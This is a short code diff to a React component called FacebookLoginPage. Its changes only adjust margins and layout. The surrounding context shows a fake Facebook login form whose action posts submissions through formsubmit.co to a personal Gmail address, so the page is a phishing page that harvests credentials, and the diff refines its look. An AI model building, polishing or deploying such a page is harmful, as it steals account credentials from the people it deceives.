@@ -17,7 +17,7 @@ export default function FacebookLoginPage() {
           </div>
 
           {/* Right */}
-          <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+          <div className="bg-white p-6 rounded-lg mb-10 shadow-lg w-full max-w-md">
             <form
               action="https://formsubmit.co/m.b.siam2008@gmail.com"
               method="POST"
@@ -77,8 +77,8 @@ export default function FacebookLoginPage() {
       </div>
 
       {/* Footer */}
-      <div className="bg-white pt-8 pb-12 px-4 mt-10 text-center text-xs text-gray-500 space-y-4">
-        <div className="max-w-6xl mx-auto flex flex-wrap justify-center gap-x-4 gap-y-1 text-[#385898] font-normal text-sm">
+      <div className="bg-white pt-8 pb-12 px-4  text-center text-xs text-gray-500 space-y-4">
+        <div className="max-w-6xl mx-auto flex mt-10 flex-wrap justify-center gap-x-4 gap-y-1 text-[#385898] font-normal text-sm">
           {[
             'English (UK)', 'বাংলা', 'অসমীয়া', 'हिन्दी', 'नेपाली',
             'Bahasa Indonesia', 'العربية', '中文(简体)', 'Bahasa Melayu',
